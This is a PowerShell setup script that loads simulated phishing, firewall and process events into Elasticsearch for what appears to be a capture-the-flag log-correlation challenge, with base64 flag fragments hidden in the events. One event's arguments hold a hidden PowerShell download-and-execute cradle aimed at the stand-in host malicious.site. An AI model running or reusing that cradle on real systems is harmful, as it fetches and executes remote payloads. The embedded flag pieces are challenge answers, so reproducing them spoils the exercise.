function challenge {
    # Simulate phishing click event (ECS compliant)
    $phishEvent = [PSCustomObject]@{
        '@timestamp' = ($(Get-Date -AsUTC).AddHours(-2)).ToString("o")
        user = @{ name = "alice" }
        url = @(@{ full = "https://phishy.site/login&begin_secret=e2N0Zl8="; domain = "phishy.site" })
        event = @{ category = "process"; type = "start"; action = "process_creation" }
        process = @{ parent = @{ name = "outlook.exe" }; name = "chrome.exe"; args = "chrome.exe --url=https://phishy.site/login&begin_secret=e2N0Zl8=" }
        message = "User clicked phishing link in email."
        b64_detected = "e2N0Zl8="
    } | ConvertTo-Json
    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $phishEvent

    # Simulate firewall event (ECS compliant)
    $fwEvent = [PSCustomObject]@{
        '@timestamp' = ($(Get-Date -AsUTC).AddHours(-2)).ToString("o")
        user = @{ name = "alice" }
        event = @{ category = "network"; type = "connection"; action = "allowed" }
        source = @{ ip = "10.0.0.5" }
        destination = @{ ip = "192.168.1.100" }
        network = @{ direction = "outbound" }
        url = @{ domain = "phishy.site" }
        message = "Firewall allowed outbound connection to phishing domain. :( Zm9yaw=="
        b64_detected = "Zm9yaw=="
    } | ConvertTo-Json
    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $fwEvent

    # Simulate another process event (ECS compliant)
    $malwareEvent = [PSCustomObject]@{
        '@timestamp' = ($(Get-Date -AsUTC).AddHours(-2)).ToString("o")
        user = @{ name = "alice" }
        url = @(@{ full = "https://malicious.site/X2NvcnJlbGF0aW9u/payload.ps1"; domain = "malicious.site" })
        event = @{ category = "process"; type = "start"; action = "process_creation" }
        process = @{ parent = @{ name = "chrome.exe" }; name = "powershell.exe"; args = '"powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\"https://malicious.site/X2NvcnJlbGF0aW9u/payload.ps1\")\""' }
        message = "Malicious PowerShell spawned after phishing click."
        b64_detected = "X2NvcnJlbGF0aW9u"
    } | ConvertTo-Json
    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $malwareEvent

    # Simulate firewall block event (ECS compliant)
    $fwBlockEvent = [PSCustomObject]@{
        '@timestamp' = ($(Get-Date -AsUTC).AddHours(-2)).ToString("o")
        user = @{ name = "alice" }
        event = @{ category = "network"; type = "connection"; action = "blocked" }
        source = @{ ip = "10.0.0.5" }
        destination = @{ ip = "8.8.8.8" }
        network = @{ direction = "outbound" }
        url = @{ domain = "malicious.site" }
        message = "Firewall blocked outbound connection to known malicious domain. :) X2lzX3Bvd2VyfQ=="
        b64_detected = "X2lzX3Bvd2VyfQ=="
    } | ConvertTo-Json
    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $fwBlockEvent

    # Add a benign event for noise (ECS compliant)
    $benignEvent = [PSCustomObject]@{
        '@timestamp' = ($(Get-Date -AsUTC).AddHours(-2)).ToString("o")
        user = @{ name = "bob" }
        event = @{ category = "process"; type = "start"; action = "process_creation" }
        process = @{ parent = @{ name = "explorer.exe" }; name = "notepad.exe"; args = "notepad.exe" }
        message = "Benign process creation."
        b64_detected = "X3N1cGVyXw=="
    } | ConvertTo-Json
    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $benignEvent

    Write-Host "FORK challenge data imported." -ForegroundColor Green
}
